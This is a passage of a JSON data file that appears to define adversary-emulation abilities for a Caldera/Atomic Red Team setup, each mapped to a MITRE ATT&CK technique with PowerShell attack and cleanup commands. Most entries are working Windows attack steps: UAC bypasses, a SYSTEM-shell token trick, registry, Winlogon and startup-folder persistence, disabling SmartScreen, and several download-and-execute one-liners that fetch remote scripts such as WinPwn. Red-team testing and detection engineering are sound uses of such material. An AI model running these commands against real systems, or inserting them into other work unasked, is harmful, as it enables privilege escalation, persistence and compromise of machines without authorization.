                    "cleanup": "Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeDC -Force -ErrorAction Ignore; Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffsetDC -Force -ErrorAction Ignore ; Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTime -Force -ErrorAction Ignore; Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffset -Force -ErrorAction Ignore; Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name EnableSmartScreen -Force -ErrorAction Ignore; Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name ShellSmartScreenLevel -Force -ErrorAction Ignore",
                    "command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name ShellSmartScreenLevel -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "5e0427f03faf554046c6a29864087b49",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "5e0427f03faf554046c6a29864087b49"
    },
    "T1547.001__multiple__Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder__1169b67e9f991716ba91833486f3c564": {
        "description": "This test will modify the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders -V \"Common Startup\" \nvalue to point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.001",
            "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Set-ItemProperty -Path  \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Common Startup\" -Value \"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"; Remove-Item \"$env:TMP\\atomictest\\\" -Recurse -Force",
                    "command": "New-Item -ItemType Directory -path \"#{new_startup_folder}\"; Copy-Item -path \"#{payload}\" -destination \"#{new_startup_folder}\"; Set-ItemProperty -Path  \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Common Startup\" -Value \"#{new_startup_folder}\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1169b67e9f991716ba91833486f3c564",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "1169b67e9f991716ba91833486f3c564"
    },
    "T1547.001__multiple__Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder__29797527e006f065df5c2d1f7b1b0b56": {
        "description": "This test change the default value of HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell from \"explorer.exe\" to the full path of \"C:\\Windows\\explorer.exe\" \nto log a change to the key's default value without breaking boot sequence. \nAn atacker will alternatively replace this with a custom shell. \n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.001",
            "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Shell-backup'); Set-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\" -Value \"$oldvalue\"; Remove-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Shell-backup'",
                    "command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\"); Set-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell-backup\" -Value \"$oldvalue\"; $newvalue = $oldvalue + \", #{payload}\"; Set-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\" -Value \"$newvalue\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "29797527e006f065df5c2d1f7b1b0b56",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "29797527e006f065df5c2d1f7b1b0b56"
    },
    "T1197__multiple__BITS Jobs__5a9be3b1696cc0cce8557f9596547e13": {
        "description": "This test simulates an adversary leveraging bitsadmin.exe to download\nand execute a payload leveraging PowerShell\n\nUpon execution you will find a github markdown file downloaded to the Temp directory\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1197",
            "name": "BITS Jobs"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:TEMP\\bitsadmin2_flag.ps1 -ErrorAction Ignore",
                    "command": "Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination $env:TEMP\\bitsadmin2_flag.ps1",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "5a9be3b1696cc0cce8557f9596547e13",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "5a9be3b1696cc0cce8557f9596547e13"
    },
    "T1134.002__multiple__Create Process with Token__fdc26580786ac9d3ffc38aea053cbd29": {
        "description": "Get SYSTEM shell - Pop System Shell using Token Manipulation technique via function of WinPwn",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1134.002",
            "name": "Create Process with Token"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "fdc26580786ac9d3ffc38aea053cbd29",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "fdc26580786ac9d3ffc38aea053cbd29"
    },
    "T1547.009__multiple__Boot or Logon Autostart Execution: Shortcut Modification__501af516bd8b24fee0c7c650ae5cc861": {
        "description": "LNK file to launch CMD placed in startup folder. Upon execution, open File Explorer and browse to \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\nto view the new shortcut.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.009",
            "name": "Boot or Logon Autostart Execution: Shortcut Modification"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\" -ErrorAction Ignore; Remove-Item \"$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\" -ErrorAction Ignore",
                    "command": "$Shell = New-Object -ComObject (\"WScript.Shell\"); $ShortCut = $Shell.CreateShortcut(\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\"); $ShortCut.TargetPath=\"cmd.exe\"; $ShortCut.WorkingDirectory = \"C:\\Windows\\System32\"; $ShortCut.WindowStyle = 1; $ShortCut.Description = \"T1547.009.\"; $ShortCut.Save(); $Shell = New-Object -ComObject (\"WScript.Shell\"); $ShortCut = $Shell.CreateShortcut(\"$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\"); $ShortCut.TargetPath=\"cmd.exe\"; $ShortCut.WorkingDirectory = \"C:\\Windows\\System32\"; $ShortCut.WindowStyle = 1; $ShortCut.Description = \"T1547.009.\"; $ShortCut.Save()",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "501af516bd8b24fee0c7c650ae5cc861",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "501af516bd8b24fee0c7c650ae5cc861"
    },
    "T1055__multiple__Process Injection__9999b5c073203122cbe5f1f5438cf637": {
        "description": "This module injects shellcode into a newly created process and executes. By default the shellcode is created,\nwith Metasploit, for use on x86-64 Windows 10 machines.\n\nNote: Due to the way the VBA code handles memory/pointers/injection, a 64bit installation of Microsoft Office\nis required.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1055",
            "name": "Process Injection"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroFile \"40c65d_T1055-macrocode.txt\" -officeProduct \"Word\" -sub \"Execute\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "40c65d_T1055-macrocode.txt"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "9999b5c073203122cbe5f1f5438cf637",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "9999b5c073203122cbe5f1f5438cf637"
    },
    "T1055.003__multiple__Thread Execution Hijacking__6a64ea6e29cdb83d468a27d6f69960cb": {
        "description": "This test injects a MessageBox shellcode generated by msfvenom in Notepad.exe using Thread Execution Hijacking. When successful, a message box will appear with the \"Atomic Red Team\" caption after one or two seconds. ",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1055.003",
            "name": "Thread Execution Hijacking"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$notepad = Start-Process notepad -passthru; Start-Process \"$PathToAtomicsFolder\\T1055.003\\bin\\InjectContext.exe\"; Start-Sleep -Seconds 5; Stop-Process $notepad.id",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6a64ea6e29cdb83d468a27d6f69960cb",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "6a64ea6e29cdb83d468a27d6f69960cb"
    },
    "T1547.001__multiple__Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder__fef50b36806647cb5a5511ae48f7e56f": {
        "description": "jse files can be placed in and ran from the startup folder to maintain persistance.\nUpon execution, \"T1547.001 Hello, World JSE!\" will be displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.001",
            "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\" -ErrorAction Ignore; Remove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\" -ErrorAction Ignore",
                    "command": "Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"; Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"; cscript.exe /E:Jscript \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"; cscript.exe /E:Jscript \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "fef50b36806647cb5a5511ae48f7e56f",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "fef50b36806647cb5a5511ae48f7e56f"
    },
    "T1547.001__multiple__Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder__3b631d04243ac011df9f91cd07025180": {
        "description": "vbs files can be placed in and ran from the startup folder to maintain persistance. Upon execution, \"T1547.001 Hello, World VBS!\" will be displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.001",
            "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\" -ErrorAction Ignore; Remove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\" -ErrorAction Ignore",
                    "command": "Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"; Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"; cscript.exe \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"; cscript.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "3b631d04243ac011df9f91cd07025180",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "3b631d04243ac011df9f91cd07025180"
    },
    "T1547.004__multiple__Boot or Logon Autostart Execution: Winlogon Helper DLL__5c23188ed301af9f1b6b55d4f3f60b46": {
        "description": "PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.004",
            "name": "Boot or Logon Autostart Execution: Winlogon Helper DLL"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Userinit\" -Force -ErrorAction Ignore",
                    "command": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, C:\\Windows\\System32\\cmd.exe\" -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "5c23188ed301af9f1b6b55d4f3f60b46",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "5c23188ed301af9f1b6b55d4f3f60b46"
    },
    "T1548.002__multiple__Abuse Elevation Control Mechanism: Bypass User Account Control__7440c68b83b6d728b4111d083facefec": {
        "description": "PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privalages\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Account Control"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"HKCU:\\software\\classes\\mscfile\" -force -Recurse -ErrorAction Ignore",
                    "command": "New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force; Set-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force; Start-Process \"C:\\Windows\\System32\\eventvwr.msc\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7440c68b83b6d728b4111d083facefec",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "7440c68b83b6d728b4111d083facefec"
    },
    "T1053.005__multiple__Scheduled Task/Job: Scheduled Task__920a251237fac2b70fe4d647aa16bfdd": {
        "description": "This module utilizes the Windows API to schedule a task for code execution (notepad.exe). The task scheduler will execute \"notepad.exe\" within\n30 - 40 seconds after this module has run\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1053.005",
            "name": "Scheduled Task/Job: Scheduled Task"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Unregister-ScheduledTask -TaskName \"Run Notepad\" -Confirm:$false",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) ; Invoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\" -officeProduct \"Word\" -sub \"Scheduler\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "920a251237fac2b70fe4d647aa16bfdd",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "920a251237fac2b70fe4d647aa16bfdd"
    },
    "T1548.002__multiple__Abuse Elevation Control Mechanism: Bypass User Account Control__824ec334619ca634d13aff308a9a064c": {
        "description": "UAC bypass using Magic technique via function of WinPwn",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Account Control"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); UACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique magic",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "824ec334619ca634d13aff308a9a064c",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "824ec334619ca634d13aff308a9a064c"
    },
    "T1547.014__multiple__Active Setup__22f293978e324252426f9c7e337ae181": {
        "description": "This test will create an \"atomic_test\" key under 'HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components' to launch calc by configuring an active setup executable and \nforcing to run active setup using the \"runonce.exe /AlternateShellStartup\" command. \nWithout the \"runonce.exe /AlternateShellStartup\" command it would run during the next logon for each user.\n\nNote: If you logout before running the cleanup command, you will be required to go through the OOBE (out-of-box experience) setup sequence to log back in. \nThe payload will only run once unless the cleanup command is run in between tests.\n\n[Active Setup Explained](https://helgeklein.com/blog/active-setup-explained/)\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.014",
            "name": "Active Setup"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" -Force -ErrorAction Ignore; Remove-Item \"HKCU:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" -Force -ErrorAction Ignore",
                    "command": "New-Item \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\" -Name \"atomic_test\" -Force; Set-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" \"(Default)\" \"ART TEST\" -Force; Set-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" \"StubPath\" \"#{payload}\" -Force ; & $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "22f293978e324252426f9c7e337ae181",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "22f293978e324252426f9c7e337ae181"
    },
    "T1548.002__multiple__Abuse Elevation Control Mechanism: Bypass User Account Control__f27b37f253617c39ac010d2ee1238b7e": {
        "description": "UAC bypass using DiskCleanup technique via function of WinPwn",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Account Control"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); UACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique DiskCleanup",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f27b37f253617c39ac010d2ee1238b7e",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "f27b37f253617c39ac010d2ee1238b7e"
    },
    "T1547.004__multiple__Boot or Logon Autostart Execution: Winlogon Helper DLL__92578413245a3418c9dc21dc5db784ff": {
        "description": "PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.004",
            "name": "Boot or Logon Autostart Execution: Winlogon Helper DLL"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Userinit\" -Force -ErrorAction Ignore",
                    "command": "Set-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, C:\\Windows\\System32\\cmd.exe\" -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "92578413245a3418c9dc21dc5db784ff",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "92578413245a3418c9dc21dc5db784ff"
    },
    "T1547.001__multiple__Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder__3c0760559a620aad7664cdf98f486127": {
        "description": "RunOnce Key Persistence via PowerShell\nUpon successful execution, a new entry will be added to the runonce item in the registry.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.001",
            "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty -Path HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce -Name \"NextRun\" -Force -ErrorAction Ignore",
                    "command": "$RunOnceKey = \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"; set-itemproperty $RunOnceKey \"NextRun\" 'powershell.exe \"IEX (New-Object Net.WebClient).DownloadString(`\"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\")\"'",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "3c0760559a620aad7664cdf98f486127",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "3c0760559a620aad7664cdf98f486127"
    },
    "T1543.003__multiple__Create or Modify System Process: Windows Service__7030b003cc5646c7cc83410d2f057575": {
        "description": "Installs A Local Service via PowerShell.\nUpon successful execution, powershell will download `AtomicService.exe` from github. Powershell will then use `New-Service` and `Start-Service` to start service. Results will be displayed.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1543.003",
            "name": "Create or Modify System Process: Windows Service"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Stop-Service -Name \"AtomicTestService_PowerShell\" 2>&1 | Out-Null; try {(Get-WmiObject Win32_Service -filter \"name='AtomicTestService_PowerShell'\").Delete()}; catch {}",
                    "command": "New-Service -Name \"AtomicTestService_PowerShell\" -BinaryPathName \"411da5_AtomicService.exe\"; Start-Service -Name \"AtomicTestService_PowerShell\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "411da5_AtomicService.exe"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "7030b003cc5646c7cc83410d2f057575",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "7030b003cc5646c7cc83410d2f057575"
    },
    "T1548.002__multiple__Abuse Elevation Control Mechanism: Bypass User Account Control__f91d7dfb1e6fd4fa742f24927ca4af26": {
        "description": "PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10\nUpon execution administrative command prompt should open\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Account Control"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"HKCU:\\software\\classes\\ms-settings\" -force -Recurse -ErrorAction Ignore",
                    "command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force; New-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force; Set-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force; Start-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f91d7dfb1e6fd4fa742f24927ca4af26",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "f91d7dfb1e6fd4fa742f24927ca4af26"
    },
    "T1547.001__multiple__Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder__55e14d8b479b905a13976c8d94016a7b": {
        "description": "This test will append a command to the  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit value to launch calc.exe on boot.\n* Requires reboot\n",
        "tactic": "multiple",
        "technique": {
